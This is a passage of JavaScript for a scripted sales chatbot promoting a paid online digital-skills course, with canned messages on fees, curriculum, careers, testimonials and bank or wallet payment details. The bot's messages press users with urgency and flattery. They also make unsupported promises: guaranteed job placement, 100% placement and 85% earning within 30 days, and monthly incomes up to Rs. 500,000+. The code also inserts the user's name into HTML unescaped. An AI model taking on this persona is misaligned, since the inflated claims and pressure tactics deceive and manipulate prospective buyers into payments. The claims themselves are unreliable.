    <li>ğŸŒ Lifetime FREE web hosting with SSL certificates</li>
    <li>ğŸ›’ No e-commerce platform fees (build unlimited stores)</li>
    <li>ğŸ¥ Bonus: Digital Marketing, Domain Flipping & YouTube Automation</li>
    <li>ğŸ¤ Lifetime personalized mentor support (even after graduation)</li>
    <li>ğŸ”§ Hands-on real-world projects in every module</li>
    <li>ğŸŒ 100% remote: learn and work from anywhere</li>
    <li>ğŸ“ˆ Start generating income from Module 1</li>
</ul>

<p><em>Trusted by thousands of students across 15+ countries. Our most loved and highly recommended program.</em></p>`);

        setTimeout(() => {
            if (!chatbotState.appointmentBooked) {
                addBotMessage(`${chatbotState.userName}, students who book a consultation after viewing program details have a <strong>90% enrollment rate</strong>. That's because once they talk to our mentor, all their questions get answered personally. ğŸ¯`);
            }
            showContextualButtons(["View Fee Structure", "Curriculum & Modules", "Career Opportunities", "Registration Process"]);
        }, 3000);
    }

    function showCurriculum() {
        chatbotState.hasSeenCurriculum = true;

        addBotMessage(`<strong>ğŸ“˜ Curriculum Overview</strong>

Practical, hands-on training from beginner to professional level:

<ol style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Web Development & Programming</strong> (Build professional websites from scratch)</li>
    <li><strong>E-Commerce Mastery</strong> (Create online stores without platform fees)</li>
    <li><strong>Search Engine Optimization</strong> (Rank websites on Google organically)</li>
    <li><strong>Social Media Marketing</strong> (Master Facebook, Instagram & LinkedIn)</li>
    <li><strong>Digital Advertising</strong> (Run profitable paid ad campaigns)</li>
    <li><strong>Freelancing & Client Acquisition</strong> (Build a sustainable business)</li>
    <li><strong>Content Creation & Copywriting</strong> (Create high-converting content)</li>
    <li><strong>YouTube Automation</strong> (Build and monetize channels)</li>
    <li><strong>Domain Flipping</strong> (Buy and sell domains for profit)</li>
    <li><strong>Project Management</strong> (Professional workflow and client relations)</li>
</ol>

<p><em>Every module includes real-world projects. You'll graduate with a professional portfolio and immediately marketable skills.</em></p>`);

        setTimeout(() => {
            addBotMessage(`That's 15+ income streams you can tap into, ${chatbotState.userName}! Most courses teach just one skill. Imagine the earning potential when you master all of these. ğŸ’°`);
            showContextualButtons(["View Fee Structure", "Career Opportunities", "Registration Process"]);
        }, 3000);
    }

    function showCareerOpportunities() {
        chatbotState.hasSeenCareer = true;

        addBotMessage(`<strong>ğŸ’¼ Career & Earning Opportunities</strong>

Graduates unlock multiple career paths:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ¢ <strong>Guaranteed Job Placement</strong> (Remote work with our partnered agency)</li>
    <li>ğŸ’» <strong>Freelancing</strong> (Upwork, Fiverr & Freelancer platforms)</li>
    <li>ğŸ›ï¸ <strong>E-Commerce Business</strong> (Launch online stores with zero fees)</li>
    <li>ğŸ“± <strong>Social Media Management</strong> (Manage brands professionally)</li>
    <li>ğŸ” <strong>SEO Consulting</strong> (Help businesses rank higher on search engines)</li>
    <li>ğŸ¥ <strong>YouTube Revenue</strong> (Automated channel income streams)</li>
    <li>ğŸŒ <strong>Domain Flipping</strong> (Premium domain reselling for profit)</li>
    <li>ğŸ“ˆ <strong>Launch Your Own Agency</strong> (With the skills you've mastered)</li>
</ul>

<p><strong>Earning Potential:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ“Š Month 1: Rs. 15,000 - 30,000 (while still learning!)</li>
    <li>ğŸ“Š Month 3: Rs. 50,000 - 100,000</li>
    <li>ğŸ“Š Month 6: Rs. 100,000 - 300,000</li>
    <li>ğŸ“Š Year 1: Rs. 200,000 - 500,000+ monthly</li>
</ul>

<p><em>These are real numbers from actual graduates. Your results depend on your dedication and effort.</em></p>`);

        setTimeout(() => {
            addBotMessage(`Every month you delay is potential income you're missing, ${chatbotState.userName}. Our graduates often say their only regret was not starting sooner! ğŸš€`);
            showContextualButtons(["View Fee Structure", "Registration Process", "Success Stories & Results"]);
        }, 4000);
    }

    function showSuccessStories() {
        addBotMessage(`<strong>ğŸŒŸ Student Success & Impact</strong>

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ“Š <strong>3,000+ students</strong> enrolled with careers transformed</li>
    <li>ğŸ’° <strong>85%+ graduates</strong> start earning within 30 days</li>
    <li>ğŸŒ Active students from <strong>15+ countries</strong></li>
    <li>â­ <strong>4.9/5 average satisfaction rating</strong> from alumni</li>
    <li>ğŸ¤ <strong>100% job placement rate</strong> for committed graduates</li>
    <li>ğŸ“ˆ Alumni have built <strong>six-figure annual businesses</strong></li>
    <li>ğŸ”„ <strong>92% completion rate</strong> (industry average is just 15%!)</li>
</ul>

<p><em>The 1-on-1 mentorship model is why our completion and success rates are dramatically higher than any online course. You're never left alone to figure things out.</em></p>`);

        setTimeout(() => {
            addBotMessage(`${chatbotState.userName}, you could be the next success story! All it takes is one decision to start. ğŸ’ª`);
            showContextualButtons(["Program Details", "View Fee Structure", "Registration Process"]);
        }, 3000);
    }

    function showIdealCandidate() {
        addBotMessage(`<strong>ğŸ¯ Who Is This Program For?</strong>

The Champions Mentorship Program is perfect for:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>âœ… <strong>Complete Beginners</strong> wanting to start a digital career from zero</li>
    <li>âœ… <strong>Students</strong> looking to build skills alongside their education</li>
    <li>âœ… <strong>Working Professionals</strong> seeking additional income streams</li>
    <li>âœ… <strong>Homemakers</strong> wanting flexible work-from-home income</li>
    <li>âœ… <strong>Freelancers</strong> wanting to expand their skillset and earn more</li>
    <li>âœ… <strong>Career Changers</strong> ready for a fresh start in digital</li>
    <li>âœ… <strong>Entrepreneurs</strong> wanting to build their online presence</li>
</ul>

<p><strong>No prior experience, degree, or technical knowledge required.</strong> The only prerequisite is motivation and commitment to learning.</p>

<p><em>If you're reading this, you already have what it takes to succeed!</em></p>`);

        setTimeout(() => {
            addBotMessage(`The fact that you're exploring this program tells me you have the drive, ${chatbotState.userName}. That's the #1 predictor of success in our program! ğŸ†`);
            showContextualButtons(["Program Details", "View Fee Structure", "Curriculum & Modules"]);
        }, 3000);
    }

    function showFeeStructure() {
        chatbotState.hasSeenFees = true;

        addBotMessage(`<strong>ğŸ’° Fee Structure</strong>

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Format:</strong> 1-on-1 Personalized Sessions</li>
    <li><strong>Schedule:</strong> Fully Flexible</li>
    <li><strong>Duration:</strong> Less than 2 months</li>
    <li><strong>Registration Fee:</strong> Rs. 5,000</li>
    <li><strong>Full Program Fee:</strong> Rs. 35,000</li>
    <li><strong>Discounted One-Time Payment:</strong> Rs. 25,000 ($90) <em>Best value!</em></li>
</ul>

<strong>What's Included (Total Value: Rs. 200,000+):</strong>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸŒ Lifetime FREE hosting with SSL (Worth Rs. 18,000/year)</li>
    <li>ğŸ›’ Zero e-commerce platform fees (Worth Rs. 85,000/year)</li>
    <li>ğŸ“š 3 bonus courses included FREE (Worth Rs. 30,000)</li>
    <li>ğŸ’¼ 100% guaranteed job placement (Priceless)</li>
    <li>ğŸ¤ Lifetime mentor support (Priceless)</li>
    <li>ğŸ“‹ Real-world projects & portfolio (Worth Rs. 15,000)</li>
</ul>

<p><strong>You're getting Rs. 200,000+ in value for just Rs. 25,000!</strong></p>

<p><em>Risk-free: Pay only Rs. 5,000 to start. Full refund within 7 days if not satisfied.</em></p>`);

        setTimeout(() => {
            addBotMessage(`${chatbotState.userName}, think about it this way: this is less than what most people spend on a single month's entertainment. But this investment pays you back every month for the rest of your career! ğŸ“ˆ`);
            showContextualButtons(["Payment Methods", "Registration Process"]);
        }, 4000);
    }

    function showPaymentMethods() {
        chatbotState.hasSeenPayment = true;

        addBotMessage(`<strong>ğŸ’³ Payment Methods</strong>

<p><strong>Bank Transfer:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Bank:</strong> United Bank Limited (UBL)</li>
    <li><strong>IBAN:</strong> PK66UNIL0109000285863354</li>
    <li><strong>Account Number:</strong> 0443285863354</li>
</ul>

<p><strong>Mobile Wallets:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>EasyPaisa / JazzCash:</strong> 03104212713</li>
</ul>

<p><strong>How It Works:</strong></p>
<ol style="margin-left: 20px; padding-left: 10px;">
    <li>Choose your preferred payment method</li>
    <li>Transfer the amount and screenshot the receipt</li>
    <li>Share payment proof via WhatsApp</li>
    <li>Receive verification within minutes</li>
    <li>Your program access is activated immediately</li>
</ol>

<p><em>International students: Contact us via WhatsApp for alternative payment methods including PayPal and Wise.</em></p>`);

        setTimeout(() => {
            showContextualButtons(["Registration Process", "View Fee Structure"]);
        }, 2000);
    }

    function showRegistrationProcess() {
        chatbotState.hasSeenRegistration = true;

        addBotMessage(`<strong>ğŸ“ 3-Step Enrollment Process</strong>

<ol style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Step 1: Register</strong>
        <br>Share your full name, email, city & WhatsApp number. We'll create your student profile instantly.</li>
    <li><strong>Step 2: Start Risk-Free</strong>
        <br>Pay only Rs. 5,000 registration fee. Attend your first 3-4 classes. Not satisfied within 7 days? Full refund, zero questions asked.</li>
    <li><strong>Step 3: Continue & Excel</strong>
        <br>Love the program? Pay the remaining fee (one-time or installments) and continue building your digital career with full support.</li>
</ol>

<p><strong>Your Safety Net:</strong></p>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ›¡ï¸ 7-day money-back guarantee</li>
    <li>ğŸ’³ Flexible payment plans</li>
    <li>ğŸ“š Immediate access to all materials</li>
    <li>ğŸ¤ Lifetime mentor support from day one</li>
    <li>ğŸ’° Many students start earning before completing the program</li>
</ul>

<p><em>We've eliminated every possible risk. The only risk left is not starting at all.</em></p>`);

        setTimeout(() => {
            const smartCTA = getSmartBookingCTA();
            if (smartCTA && !chatbotState.appointmentBooked) {
                addBotMessage(smartCTA);
            } else {
                addBotMessage(`Ready to take the first step, ${chatbotState.userName}? A free consultation is the perfect way to begin! ğŸš€`);
            }
            showContextualButtons(["Payment Methods", "View Fee Structure"]);
        }, 4000);
    }

    // ==================== TRUST BUILDING FLOW ====================

    function showTrustFactors() {
        chatbotState.hasSeenTrust = true;

        const trustMessages = [
            `${chatbotState.userName}, you can join with complete confidence. Here's our promise: if you don't gain real value from this program or don't see income results, we will refund your entire fee. No fine print, no hassle.`,

            `As a graduate, you'll have the opportunity to work remotely with our partnered digital marketing agency. That means you can start earning from home immediately after completing the program. Many students earn while still learning!`,

            `Not ready to commit fully? No problem! You only pay Rs. 5,000 to start. Attend 3-4 classes, experience the quality, and then decide. If it's not for you, you get your money back. We take on all the risk because we believe in our program.`,

            `We encourage thorough research before enrolling. Review the modules, student testimonials, and curriculum on our website. Smart decisions come from good research, and we're confident the quality will speak for itself.`
        ];

        showSequentialMessages(trustMessages, 8000, () => {
            chatbotState.currentStep = 'website_reading';
            addBotMessage(`${chatbotState.userName}, have you had a chance to review the course details and modules on our website?`);
            showSuggestedButtons(["Yes, I've reviewed everything", "No, I still need to review"]);
        });
    }

    // ==================== REUSABLE UI FUNCTIONS ====================

    function showMainMenu() {
        let menuOptions = [
            "Program Details",
            "Curriculum & Modules",
            "Who Is This For?",
            "View Fee Structure",
            "Career Opportunities",
            "Success Stories & Results",
            "How Long Is the Program?",
            "Where Are You Located?",
            "Registration Process",
            "Payment Methods"
        ];

        if (!chatbotState.appointmentBooked && !chatbotState.bookingInProgress) {
            menuOptions.push("Book an Appointment");
        }

        chatbotState.bookingInProgress = false;
        chatbotState.currentStep = 'menu';
        showSuggestedButtons(menuOptions);
    }

    function showContextualButtons(extraButtons = []) {
        let buttons = [...extraButtons];

        if (!chatbotState.appointmentBooked && !chatbotState.bookingInProgress) {
            buttons.push("Book an Appointment");
        } else if (chatbotState.bookingInProgress) {
            buttons.push("Cancel Booking");
        }

        buttons.push("Back to Menu");
        showSuggestedButtons(buttons);
    }

    function showSequentialMessages(messages, delay, onComplete) {
        messages.forEach((msg, index) => {
            setTimeout(() => {
                addBotMessage(msg);
                if (index === messages.length - 1 && onComplete) {
                    setTimeout(onComplete, delay);
                }
            }, delay * index);
        });
    }

    // ==================== DOM MANIPULATION ====================

    function addUserMessage(message) {
        appendMessage('user-message', message, false);
    }

    function addBotMessage(message) {
        appendMessage('bot-message', message, true);
        chatbotState.conversationHistory.push({ sender: 'bot', message });
    }

    function appendMessage(className, content, isHTML) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${className}`;
        if (isHTML) {
            messageDiv.innerHTML = content;
        } else {
            messageDiv.textContent = content;
        }
        chatbotMessages.appendChild(messageDiv);
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
    }

    function showTypingIndicator() {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'typing-indicator';
        typingDiv.id = 'typingIndicator';
        typingDiv.innerHTML = '<span></span><span></span><span></span>';
        chatbotMessages.appendChild(typingDiv);
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;
    }

    function removeTypingIndicator() {
        const indicator = document.getElementById('typingIndicator');
        if (indicator) indicator.remove();
    }

    function showSuggestedButtons(options) {
        suggestedButtons.innerHTML = '';
        options.forEach(option => {
            const button = document.createElement('button');
            button.className = 'suggested-btn';
            button.textContent = option;
            button.addEventListener('click', () => {
                userInput.value = option;
                handleUserInput();
            });
            suggestedButtons.appendChild(button);
        });
    }

    function clearSuggestedButtons() {
        suggestedButtons.innerHTML = '';
    }

    // ==================== GLOBAL: WHATSAPP SHARING ====================

    window.shareOnWhatsApp = function() {
        const { userName, userEmail, userWhatsapp, appointmentDate, appointmentTime } = chatbotState;
        const message = encodeURIComponent(
            `*Appointment Confirmation | Champions Mentorship Program*\n\n` +
            `Name: ${userName}\nEmail: ${userEmail}\nWhatsApp: ${userWhatsapp}\n` +
            `Date: ${appointmentDate}\nTime: ${appointmentTime}\n` +
            `Program: Champions Mentorship Program\n\n` +
            `I would like to confirm this consultation appointment. Thank you!`
        );
        window.open(`https://wa.me/923314041010?text=${message}`, '_blank');
    };
});



// ChatBot Ended

